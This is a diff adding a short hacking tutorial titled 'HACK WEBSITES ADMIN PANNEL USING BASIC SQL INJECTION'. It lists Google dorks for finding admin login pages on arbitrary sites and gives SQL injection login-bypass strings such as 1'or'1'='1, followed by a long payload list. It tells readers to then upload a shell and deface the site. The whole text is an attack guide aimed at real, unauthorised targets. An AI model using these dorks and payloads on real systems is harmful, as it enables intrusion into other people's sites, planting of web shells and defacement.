@@ -1,0 +1,83 @@
+HACK WEBSITES ADMIN PANNEL USING BASIC SQL INJECTION
+
+You might have seen hackers hacking and defaceing websites, editing it with their own stuff, makeing post on websites etc. There are many methods of doing this, In this tutorial I will be showing you a very basic and simply SQLi (Structured Query Language Injection). I will show you how to find the websites admin panel using a simple google dork and a SQL query to bypass the admin user name and password and enter into the panel. When you are in the panel just find a upload option and upload your shell, then deface it.
+
+Dorks: inurl:adminlogin.aspx
+
+inurl:admin/index.php
+
+inurl:administrator.php
+
+inurl:administrator.asp
+
+inurl:login.asp
+
+inurl:login.aspx
+
+inurl:login.php
+
+inurl:admin/index.php
+
+inurl:adminlogin.aspx
+
+# Try to make your own dorks also to get more success rate.​
+
+Hundreds of sites will open up having /adminlogin.aspx in their URL. Select any website, you will get the area from where the admins login. Fill the details as:
+
+User: 1'or'1'='1
+
+Password: 1'or'1'='1
+
+Use the above mentioned login details and you will be into the admin panel of a website. I will not work for all the websites you will find, but will work on most of the website.
+
+Other InjecTion Queries:​
+
+‘ or 1=1 –
+
+1'or’1'=’1
+
+admin’–
+
+” or 0=0 –
+
+or 0=0 –
+
+‘ or 0=0 #
+
+” or 0=0 #
+
+or 0=0 #
+
+‘ or ‘x’='x
+
+” or “x”=”x
+
+‘) or (‘x’='x
+
+‘ or 1=1–
+
+” or 1=1–
+
+or 1=1–
+
+‘ or a=a–
+
+” or “a”=”a
+
+‘) or (‘a’='a
+
+“) or (“a”=”a
+
+hi” or “a”=”a
+
+hi” or 1=1 –
+
+hi’ or 1=1 –
+
+hi’ or ‘a’='a
+
+hi’) or (‘a’='a
+
+hi”) or (“a”=”)
+
+#deepnet
